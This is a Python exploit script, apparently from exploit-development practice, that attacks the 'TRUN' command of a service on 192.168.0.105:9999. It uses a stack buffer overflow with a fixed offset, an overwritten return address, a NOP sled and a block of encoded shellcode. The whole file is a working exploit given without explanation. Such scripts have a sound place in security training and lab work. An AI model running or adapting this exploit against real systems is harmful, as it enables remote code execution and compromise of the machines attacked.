import socket
import struct 

s = socket.socket()
s.connect(("192.168.0.105",9999))
total_length = 2984
# badChars = b"".join([struct.pack('<B',x) for x in range(1,256)])
offset = 2003
new_eip = struct.pack("<I",0x62501203)
nop_sled = b"\x90" * 16

buf =  b""
buf += b"\xdb\xdd\xbb\xab\x90\x3a\x32\xd9\x74\x24\xf4\x5e\x31"
buf += b"\xc9\xb1\x59\x83\xc6\x04\x31\x5e\x15\x03\x5e\x15\x49"
buf += b"\x65\xc6\xda\x02\x86\x37\x1b\x7c\xb6\xe5\x92\x99\xdc"
buf += b"\x82\xf7\x51\x96\xc7\xfb\x1a\xfa\xf3\x88\x6e\xd3\xca"
buf += b"\x71\x81\x94\x67\xa8\xac\x1a\xdb\x88\xaf\xe6\x26\xdd"
buf += b"\x0f\xd6\xe8\x10\x4e\x1f\xbf\x5f\xbf\xcd\xcb\xf2\x2f"
buf += b"\xa5\x40\xb0\x73\x48\x87\xbe\xcb\x32\xa2\x01\xbf\x8e"
buf += b"\xad\x51\x6f\x84\xe6\x49\x04\xc2\xd6\x68\xc9\x76\xdf"
buf += b"\x1f\xd1\x31\xd1\x20\xa2\xf6\x9a\xde\x62\xc7\x5c\x21"
buf += b"\x45\x25\xf1\xa3\x9e\x0e\xe9\xd1\xd4\x6c\x94\xe1\x2f"
buf += b"\x0e\x42\x67\xaf\xa8\x01\xdf\x0b\x48\xc5\x86\xd8\x46"
buf += b"\xa2\xcd\x86\x4a\x35\x01\xbd\x77\xbe\xa4\x11\xfe\x84"
buf += b"\x82\xb5\x5a\x5e\xaa\xec\x06\x31\xd3\xee\xef\xee\x71"
buf += b"\x65\x1d\xf8\x06\x86\xdd\x05\x5b\x10\x11\xc8\x64\xe0"
buf += b"\x3d\x5b\x16\xd2\xe2\xf7\xb0\x5e\x6a\xde\x47\xd7\x7c"
buf += b"\xe1\x98\x5f\xec\x1f\x19\x9f\x24\xe4\x4d\xcf\x5e\xcd"
buf += b"\xed\x84\x9e\xf2\x3b\x30\x95\x64\x04\x6c\xa9\x11\xec"
buf += b"\x6e\xaa\xc8\xb0\xe7\x4c\xba\x18\xa7\xc0\x7b\xc9\x07"
buf += b"\xb1\x13\x03\x88\xee\x04\x2c\x43\x87\xaf\xc3\x3d\xff"
buf += b"\x47\x7d\x64\x8b\xf6\x82\xb3\xf1\x39\x08\x31\x05\xf7"
buf += b"\xf9\x30\x15\xe0\x9d\xba\xe5\xf1\x0b\xba\x8f\xf5\x9d"
buf += b"\xed\x27\xf4\xf8\xd9\xe7\x07\x2f\x5a\xef\xf8\xae\x6a"
buf += b"\x9b\xcf\x24\xd2\xf3\x2f\xa9\xd2\x03\x66\xa3\xd2\x6b"
buf += b"\xde\x97\x81\x8e\x21\x02\xb6\x02\xb4\xad\xee\xf7\x1f"
buf += b"\xc6\x0c\x21\x57\x49\xef\x04\xeb\x8e\x0f\xda\xc4\x36"
buf += b"\x67\x24\x55\xc7\x77\x4e\x55\x97\x1f\x85\x7a\x18\xef"
buf += b"\x66\x51\x71\x67\xec\x34\x33\x16\xf1\x1c\x95\x86\xf2"
buf += b"\x93\x0e\x39\x88\xdc\xb1\xba\x6d\xf5\xd5\xbb\x6d\xf9"
buf += b"\xeb\x80\xbb\xc0\x99\xc7\x7f\x77\x91\x72\xdd\xde\x38"
buf += b"\x7c\x71\x20\x69"

shellcode = buf

payload = [

    b"TRUN /.:/",
    b"A" * offset, 
    new_eip,
    nop_sled,
    shellcode,
    b"C"*(total_length - offset - len(new_eip) -len(nop_sled) - len(shellcode))
    
    
]

payload = b"".join(payload)

s.send(payload)

s.close()
